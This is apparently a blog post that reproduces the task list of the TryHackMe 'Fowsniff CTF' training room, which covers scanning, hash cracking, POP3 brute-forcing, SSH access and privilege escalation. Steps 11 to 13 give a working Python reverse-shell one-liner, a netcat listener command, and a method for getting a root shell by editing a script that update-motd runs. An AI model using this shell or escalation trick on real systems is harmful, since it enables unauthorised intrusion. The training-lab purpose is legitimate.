---
title:  "THM: Fowsniff CTF"
date:   2024-03-31 19:00:00 +0000
categories: [CTF]
tags: [CTF]
---

![img](/assets/img/ctf-fowsniff.png)  


---
Ref: 

- [THM: Fowsniff CTF](https://tryhackme.com/r/room/ctf)

---
Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.



1. Using nmap, scan this machine. What ports are open?


2. Using the information from the open ports. Look around. What can you find?


3. Using Google, can you find any public information about them?


4. Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.

5. Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?


6. What was seina's password to the email service?

Answer : **********

7. Can you connect to the pop3 service with her credentials? What email information can you gather?

8. Looking through her emails, what was a temporary password set for her?

Answer format: ***********************

9. In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.


10. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?


11. Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Other reverse shells: [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).


12. If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!


13. Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!

--- 

If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

If its easier, follow this walkthrough with the deployed machine on the site.
